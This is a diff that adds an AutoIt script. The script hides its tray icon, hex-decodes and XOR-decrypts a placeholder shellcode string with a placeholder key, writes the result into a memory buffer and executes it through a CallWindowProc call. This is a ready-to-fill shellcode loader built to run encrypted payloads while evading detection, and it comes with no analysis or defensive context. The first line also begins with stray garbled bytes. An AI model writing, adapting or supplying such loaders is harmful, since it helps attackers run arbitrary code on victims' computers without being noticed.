@@ -1,0 +1,24 @@
+ÿœ#NoTrayIcon
+$code = "<shellcode>"
+$code2 = HexToString($code)
+$shellcode = "0x" & StringStripWS(XORCipher($code2,"<pass>"),3)
+$shellcode_buffer = DllStructCreate("BYTE[" & BinaryLen($shellcode) & "]")
+$put_shellcode_to_buffer = DllStructSetData($shellcode_buffer, 1, $shellcode)
+$shellcode_execute = DllCall("user32.dll", "lresult", "CallWindowProc", "ptr", DllStructGetPtr($shellcode_buffer))
+Func XORCipher($sData, $sKey)
+    Local $sResult = ""
+    Local $iKeyLen = StringLen($sKey)
+    For $i = 1 To StringLen($sData)
+        Local $c = StringMid($sData, $i, 1)
+        Local $k = StringMid($sKey, Mod($i - 1, $iKeyLen) + 1, 1)
+        $sResult &= Chr(BitXOR(Asc($c), Asc($k)))
+    Next
+    Return $sResult
+EndFunc
+Func HexToString($sHex)
+    Local $sString = ""
+    For $i = 1 To StringLen($sHex) Step 2
+        $sString &= Chr(Dec(StringMid($sHex, $i, 2)))
+    Next
+    Return $sString
+EndFunc
